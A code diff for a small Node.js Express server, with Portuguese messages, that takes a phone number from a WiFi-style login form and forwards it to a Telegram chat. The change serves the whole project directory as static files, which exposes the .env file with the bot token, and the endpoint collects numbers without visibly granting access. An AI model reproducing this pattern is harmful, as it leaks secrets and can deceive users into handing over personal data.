@@ -1,38 +1,40 @@
+require('dotenv').config();
 const express = require('express');
 const bodyParser = require('body-parser');
-const path = require('path');
-require('dotenv').config();
 const { Telegraf } = require('telegraf');
 
 const app = express();
-const bot = new Telegraf(process.env.TELEGRAM_TOKEN);
-const PORT = process.env.PORT || 3000;
+const port = 3000;
 
 app.use(bodyParser.json());
-app.use(express.static(path.join(__dirname, 'public')));
+app.use(express.static(__dirname));
 
-app.post('/conectar', async (req, res) => {
-  const { numero } = req.body;
-  if (!numero) return res.status(400).json({ message: 'Número não fornecido.' });
+const bot = new Telegraf(process.env.TELEGRAM_TOKEN);
 
-  const msg = `📲 Novo login WiFi!\nNúmero: ${numero}`;
+// Endpoint para receber número de telefone e enviar para o admin
+app.post('/login', async (req, res) => {
+  const { phone } = req.body;
+
+  if (!phone) {
+    return res.status(400).json({ success: false, message: 'Número inválido.' });
+  }
+
+  const msg = `📲 Novo usuário conectado:\nNúmero: ${phone}`;
+
   try {
     await bot.telegram.sendMessage(process.env.CHAT_ID, msg);
-    res.json({ message: 'Número enviado com sucesso!' });
-  } catch (err) {
-    console.error('Erro ao enviar para o bot:', err);
-    res.status(500).json({ message: 'Erro ao enviar para o Telegram.' });
+    res.json({ success: true, message: 'Conectado com sucesso! Aguarde o acesso.' });
+  } catch (error) {
+    console.error('Erro ao enviar para Telegram:', error.message);
+    res.status(500).json({ success: false, message: 'Erro interno. Tente novamente.' });
   }
 });
 
-bot.launch()
-  .then(() => console.log('🤖 Bot Telegram iniciado com sucesso!'))
-  .catch(err => console.error('Erro ao iniciar o bot:', err));
-
+// Manter servidor ativo
 setInterval(() => {
   console.log('🔄 Servidor ativo...');
 }, 30000);
 
-app.listen(PORT, () => {
-  console.log(`🌐 Servidor rodando em http://localhost:${PORT}`);
+app.listen(port, () => {
+  console.log(`🌐 Servidor rodando em http://localhost:${port}`);
 });
